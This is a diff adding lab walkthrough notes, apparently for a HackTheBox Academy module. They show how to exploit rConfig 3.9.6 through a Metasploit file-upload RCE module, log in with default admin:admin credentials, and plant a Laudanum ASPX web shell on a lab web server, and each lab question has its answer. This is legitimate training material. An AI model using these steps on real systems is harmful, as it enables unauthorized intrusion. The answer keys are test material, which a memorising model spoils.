@@ -180,3 +180,88 @@ Win vuln table
 
 ### Questions
 
+1. What language is the payload written in that gets uploaded when executing rconfig\_vendors\_auth\_file\_upload\_rce?
+
+`nmap -sVC 10.129.13.209`
+
+* website running under -p80
+* def creds admin:admin work
+
+website -> running **rConfig -v 3.9.6**
+
+`msfconsole -q`
+
+`search rconfig`
+
+`use 3`
+
+* linux/http/**rconfig\_vendors\_auth\_file\_upload\_rce**
+
+`set RHOSTS 10.129.13.209`
+
+`set LHOST tun0`
+
+`exploit`
+
+<mark style="color:red;">**answer: PHP**</mark>&#x20;
+
+* file for exploit: eourdaqjvc.php
+
+2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
+
+`cd /devicedetails`
+
+`ls`
+
+`cat hostnameinfo.txt`
+
+<mark style="color:red;">**answer: edgerouter-isp**</mark>
+
+
+
+## Web Shells
+
+* browser-based shell session where we can interact with OS of a web server
+* we must first find a website vuln that can give us file upload capability...
+* payload is mostly written in a web language on the target server
+
+
+
+### Landanum
+
+* repo of ready-made files&#x20;
+* many languages written payloads (asp, aspx, jsp, php...)
+* preinstalled in Parrot and Kali
+  * /usr/share/webshells/laudanum
+
+#### Questions
+
+1. Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)
+
+cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/zihuatanejo/demo.aspx
+
+modify demo.aspx file (add IP address of target)
+
+go to status.inlanefreight.local (after adding it to etc/hosts)
+
+upload a demo.aspx file
+
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+move to URL -> `status.inlanefreight.local\files\demo.aspx`
+
+<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+`dir`
+
+* <mark style="color:red;">**c:\windows\system32\inetsrv**</mark>
+
+2. Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)
+
+<mark style="color:red;">**/usr/share/webshells/laudanum/aspx/shell.aspx**</mark>
+
+### Antak
+
+
+
+### PHP
